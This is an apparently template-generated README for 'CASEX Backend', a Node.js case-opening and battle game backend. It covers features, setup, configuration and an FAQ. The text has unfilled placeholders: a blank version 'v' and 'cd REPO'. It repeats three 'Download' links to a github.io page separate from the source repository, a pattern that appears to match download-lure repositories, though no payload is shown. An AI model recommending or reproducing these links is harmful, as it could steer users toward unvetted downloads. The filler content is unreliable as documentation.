# CASEX Backend v - game backend 2026

> **CASEX Backend is a Node.js game backend for case opening and battles, bringing auth, payments, live WebSocket features, and verified game flows together in one API stack.**

[![Platform](https://img.shields.io/badge/Platform-Node.js-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/will-moore89/casex-battle-backend-api?style=flat-square)](https://github.com/will-moore89/casex-battle-backend-api)

---

<p align="center">
  <a href="https://will-moore89.github.io/casex-battle-backend-api/">
    <img src="https://img.shields.io/badge/Download-CASEX%20Backend%20Latest-brightgreen?style=for-the-badge" alt="Download CASEX Backend">
  </a>
</p>

> **[Direct Download - CASEX Backend v](https://will-moore89.github.io/casex-battle-backend-api/)**

---

[Download Latest Build](https://will-moore89.github.io/casex-battle-backend-api/)

---

## Overview

CASEX Backend provides the server layer for game-focused products, with endpoints that handle account access, inventory operations, case opening, battles, upgrades, payments, and admin tasks. The stack is centered on Node.js and pairs Express-style routing with PostgreSQL, Prisma, Redis, JWT sessions, and Socket.IO/WebSocket messaging.

It fits projects that need real-time gameplay coordination alongside standard backend responsibilities such as authentication, moderation, promo management, and transaction processing. The included design supports Steam OpenID login, refresh-token-based sessions, and provably fair validation paths for game actions.

---

## What It Includes

- REST API coverage for auth, users, cases, battles, upgrade, inventory, payments, promo, and admin routes
- Steam OpenID sign-in with JWT cookies and refresh token support
- Provably fair logic for case opening and upgrade verification
- WebSocket-based communication for battles and chat
- PostgreSQL persistence with Prisma transactions
- Redis integration for fast state handling and shared runtime data
- Payment deposit and withdrawal flows for balance movement
- Admin dashboard endpoints plus moderation-oriented controls

---

## Setup

Clone the repository and install the Node.js dependencies:

- git clone https://github.com/will-moore89/casex-battle-backend-api.git
- cd REPO
- npm install

After your environment variables are configured, start the backend with your project entry point or package scripts. If the repository includes a start command, use it once the database and cache services are online.

---

## How to Use

A typical deployment follows a service-first sequence:

1. Set up database, Redis, Steam auth, and JWT configuration.
2. Run Prisma migrations or any database initialization steps used in your workflow.
3. Launch the API server.
4. Point your frontend, admin panel, or game clients at the REST and WebSocket endpoints.
5. Use the battle, case opening, inventory, payment, and moderation routes as required.

Example workflow:

- Authenticate with Steam OpenID
- Receive JWT cookies and refresh tokens
- Call REST endpoints for user and inventory actions
- Open a WebSocket channel for live battle or chat updates
- Apply admin or moderation operations through protected endpoints

---

## Configuration

Most of the runtime settings are expected to come from environment variables or service configuration files. Common values for this kind of stack include:

    NODE_ENV=production
    DATABASE_URL=postgresql://user:password@localhost:5432/casex
    REDIS_URL=redis://localhost:6379
    JWT_SECRET=replace_me
    STEAM_API_KEY=replace_me

Tune these values to match your deployment, especially for authentication, database access, cache connectivity, and payment-related integrations.

---

## System Requirements

- Node.js runtime
- PostgreSQL database
- Redis service
- Prisma-compatible database setup
- WebSocket-capable hosting for real-time features
- Access to Steam OpenID-related credentials if that flow is enabled
- Enough storage and memory for application data, logs, and live session handling

---

## FAQ

**How do I get started?**  
Install the dependencies, set the environment values, prepare the database, and start the backend process.

**Where are the main settings?**  
Check environment variables, Prisma configuration, and any server bootstrap files that control runtime behavior.

**What if authentication is not working?**  
Review the Steam OpenID configuration, JWT secret, cookie settings, and callback or redirect endpoints.

**How do I handle database issues?**  
Verify the PostgreSQL connection string, migration status, and Prisma transaction setup.

**Why are real-time features not connecting?**  
Make sure WebSocket traffic is allowed and that Socket.IO or websocket client settings align with the server.

**How are updates handled?**  
Watch repository changes and redeploy the backend after checking API, schema, or runtime updates.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
